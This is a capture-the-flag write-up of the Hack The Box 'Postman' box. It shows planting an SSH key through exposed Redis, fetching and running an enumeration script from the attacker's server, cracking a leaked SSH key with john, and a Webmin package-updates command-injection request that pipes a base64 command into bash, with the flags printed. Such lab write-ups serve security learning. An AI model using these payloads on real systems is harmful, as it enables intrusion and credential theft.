---
title: "CTF: HTB 2020 Postman"
toc: true
toc_label: "Table of Contents"
toc_icon: "cog"
excerpt: "This is my solution to the postman box."
classes: wide
categories:
  - Blog
tags:
  - ctf
  - writeup
  - htb
  - Redis
  - Webmin
---

# Postman

IP: 10.10.10.160

## New enumeration step 

I found an new way to automate finding basic exploits so this is my secret.
its runnning `nmap` with `searchsploit`.

```sh
#!/bin/bash

# by bread auto vuln
nmap -p 1-65535 -T4 -A -v -sV -oX $2.xml $1
searchsploit -v --nmap $2.xml
```

anyway here are the open ports found.

```sh
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/Postman#./autovuln.sh
...
Scanning 10.10.10.160 [1000 ports]
Discovered open port 22/tcp on 10.10.10.160
Discovered open port 80/tcp on 10.10.10.160
Discovered open port 10000/tcp on 10.10.10.160
...
```

### Redis RCE nope... well sort of 

looking up the ports i found redis, and start looking for RCE's.

- https://github.com/n0b0dyCN/redis-rogue-server
- https://github.com/Ridter/redis-rce/blob/master/redis-rce.py 
- https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html

figure this looks easy enough.

```sh
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/Postman# ssh-keygen -t rsa
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/Postman# $(echo -e "nn"; cat ./id_rsa.pub; echo -e "nn") > bread.txt
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/Postman# cat bread.txt | redis-cli -h 10.10.10.160 -x set crackit
```

### Redis to user

spin up a simple webserver 
`python -m SimpleHTTPServer 8000`

copy across `LinEnum.sh`
```sh
redis@Postman:/tmp/.bread$ wget 10.10.14.2:8000/LinEnum.sh
redis@Postman:/tmp/.bread$ chmod +x LinEnum.sh && ./LinEnum.sh
...
root        702  0.0  3.1  95304 29328 ?        Ss   01:44   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
...
```

thats an interesting line, lets look into it... ok webmin seems like a dead end atm.


#### More ENUM!

one of the only other interesting thing was the other user `Matt`.
so lets see what `Matt`'s footprint is like on the system.

```sh
redis@Postman:/$ find . -name "*" -user Matt 2>/dev/null
./opt/id_rsa.bak
./home/Matt
./home/Matt/.bashrc
./home/Matt/.bash_history
./home/Matt/.gnupg
./home/Matt/.ssh
./home/Matt/user.txt
./home/Matt/.selected_editor
./home/Matt/.local
./home/Matt/.local/share
./home/Matt/.profile
./home/Matt/.cache
./home/Matt/.wget-hsts
./home/Matt/.bash_logout
./var/www/SimpleHTTPPutServer.py
```

well look at the first one thats kinda dumb

### crack Matts SSH key

good old ssh to john and then john with rockyou.

```sh
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/Postman# mkdir Matt
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/Postman# cd Matt/
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/Postman/Matt# nano id_rsa.bak
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/Postman/Matt# /usr/share/john/ssh2john.py id_rsa.bak >> hash
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/Postman/Matt# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa.bak)
1g 0:00:00:13 DONE (2020-02-14 13:45) 0.07627g/s 1093Kp/s 1093Kc/s 1093KC/sa6_123..*7¡Vamos!
Session completed
```

ssh in didn't work so i went with `su Matt` and that worked *shrug*, do what you gotta do.

```
redis@Postman:/$ su Matt 
Password: 
Matt@Postman:/$ cd ~
Matt@Postman:~$ cat user.txt 
517ad0ec2458ca97af8d93aac08a2f3c
```

    `517ad0ec2458ca97af8d93aac08a2f3c`

### What the hell is webmin

Ok i had to find out what is going on with the `webmin`, so i had a look at the config file.
it mentions `Matt` a bit so i assume `Matt` has some kinda access.

```sh
Matt@Postman:/etc/webmin$ cat config 
find_pid_command=ps auwwwx | grep NAME | grep -v grep | awk '{ print $2 }'
path=/bin:/usr/bin:/sbin:/usr/sbin:/usr/local/bin
passwd_uindex=0
ld_env=LD_LIBRARY_PATH
tempdelete_days=7
by_view=0
passwd_pindex=1
passwd_mindex=4
passwd_cindex=2
passwd_file=/etc/shadow
os_type=debian-linux
os_version=9.0
real_os_type=Ubuntu Linux
real_os_version=18.04.3
lang=en.UTF-8
log=1
referers_none=1
md5pass=1
theme=authentic-theme
product=webmin
webprefix=
realname_Matt=Matt
```

the config didnt do much for me (other than `realname_Matt=Matt`) so i had a look at the website.
and yes, if we visit `https://10.10.10.160:10000/` we can log in as `Matt`.

## Root via burp

After searching for non-metasploit exploits i found that 

```
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/Postman/Matt# searchsploit webmin -w
--------------------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                                         |  URL
--------------------------------------------------------------------------------------- --------------------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                        | https://www.exploit-db.com/exploits/23535
Webmin - Brute Force / Command Execution                                               | https://www.exploit-db.com/exploits/705
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                            | https://www.exploit-db.com/exploits/22275
Webmin 0.x - 'RPC' Privilege Escalation                                                | https://www.exploit-db.com/exploits/21765
Webmin 0.x - Code Input Validation                                                     | https://www.exploit-db.com/exploits/21348
Webmin 1.5 - Brute Force / Command Execution                                           | https://www.exploit-db.com/exploits/746
Webmin 1.5 - Web Brute Force (CGI)                                                     | https://www.exploit-db.com/exploits/745
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                  | https://www.exploit-db.com/exploits/21851
Webmin 1.850 - Multiple Vulnerabilities                                                | https://www.exploit-db.com/exploits/42989
Webmin 1.900 - Remote Command Execution (Metasploit)                                   | https://www.exploit-db.com/exploits/46201
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                 | https://www.exploit-db.com/exploits/46984
Webmin 1.920 - Remote Code Execution                                                   | https://www.exploit-db.com/exploits/47293
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                      | https://www.exploit-db.com/exploits/47230
Webmin 1.x - HTML Email Command Execution                                              | https://www.exploit-db.com/exploits/24574
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (PHP)                     | https://www.exploit-db.com/exploits/1997
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Perl)                    | https://www.exploit-db.com/exploits/2017
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                       | https://www.exploit-db.com/exploits/2462
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                   | https://www.exploit-db.com/exploits/2451
webmin 0.91 - Directory Traversal                                                      | https://www.exploit-db.com/exploits/21183
--------------------------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Result
```

after looking a couple up this one sort of stood out (2019-12840).

https://github.com/Dog9w23/Webmin-1.910-Exploit/blob/master/Webmin%201.910%20-%20Remote%20Code%20Execution%20using%20BurpSuite

intercepted my connection with burp.

Modified the command to just `cat root.txt` and there we go.

```
POST /package-updates/update.cgi HTTP/1.1
Host: 10.10.10.160:10000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Progressive-URL: https://10.10.10.160:10000/package-updates/update.cgi
X-Requested-From: package-updates
X-Requested-From-Tab: webmin
X-Requested-With: XMLHttpRequest
Content-Length: 116
DNT: 1
Connection: close
Referer: https://10.10.10.160:10000/package-updates/update.cgi?xnavigation=1
Cookie: redirect=1; testing=1; sid=4ae4346a6a9e0cfaffc12b4d51e0b4eb
Pragma: no-cache
Cache-Control: no-cache

u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7becho%2cY2F0IC9yb290L3Jvb3QudHh0%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22
```


here is the output from burp:

```html
<div class="panel-body">
Building complete list of packages ..<p>
Now updating <tt>acl  | bash -c "{echo,Y2F0IC9yb290L3Jvb3QudHh0}|{base64,-d}|{bash,-i}"</tt> ..<br>
<ul>
<b>Installing package(s) with command <tt>apt-get -y  install acl  | bash -c "{echo,Y2F0IC9yb290L3Jvb3QudHh0}|{base64,-d}|{bash,-i}"</tt> ..</b><p>
<pre>bash: cannot set terminal process group (702): Inappropriate ioctl for device
bash: no job control in this shell
root@Postman:/usr/share/webmin/package-updates/# cat /root/root.txt
a257741c5bed8be7778c6ed95686ddce
root@Postman:/usr/share/webmin/package-updates/# exit
</pre>
<b>.. install complete.</b><p>
</ul><br>
No packages were installed. Check the messages above for the cause of the error.<p>
```

    `a257741c5bed8be7778c6ed95686ddce`



